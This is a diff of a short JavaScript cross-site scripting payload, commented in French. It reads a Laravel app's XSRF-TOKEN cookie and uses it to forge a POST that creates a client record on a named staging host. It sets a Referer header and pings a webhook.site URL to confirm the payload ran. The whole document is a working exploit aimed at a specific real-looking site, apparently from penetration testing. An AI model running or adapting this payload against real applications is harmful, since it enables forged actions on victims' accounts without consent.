@@ -1,31 +1,29 @@
 (function () {
-  // 🧪 Étape 1 : récupérer le token CSRF depuis le cookie
+  // 🔐 Récupérer le token CSRF depuis le cookie
   const tokenMatch = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
   if (!tokenMatch) return;
   const token = decodeURIComponent(tokenMatch[1]);
 
-  // 🛠 Étape 2 : préparer le body encodé (comme un vrai formulaire Laravel)
+  // 📦 Préparer les données POST
   const body = new URLSearchParams({
-    client_name: "ExploitClientXSS",
-    new_activity: "",
+    client_name: "ExploitXSS",
     email: "xss@evil.com",
-    language_id: "1",
-    phone_number: "0606060606",
-    phone_type: "primary",
-    address: "PayloadLand",
-    societeinfo_id: "",
+    phone_number: "0102030405",
+    phone_type: "mobile",
+    address: "Injecté via XSS",
     _token: token
   });
 
-  // 🎯 Étape 3 : envoi POST vers /clients
-  fetch("/clients", {
+  // 🎯 Requête POST avec URL absolue et Referer
+  fetch("https://current-legacy.ci.plany.app/clients", {
     method: "POST",
     headers: {
-      "Content-Type": "application/x-www-form-urlencoded"
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Referer": "https://current-legacy.ci.plany.app/clients"
     },
     body: body.toString()
   });
 
-  // ✅ (optionnel) Ping de fin dans webhook.site pour confirmer l’exécution
-  fetch("https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386?status=client_created");
+  // (Optionnel) ping webhook.site pour confirmer exécution
+  fetch("https://webhook.site/4e27c3b8-ea10-40a9-a816-ac1d92350386?status=client_payload_executed");
 })();
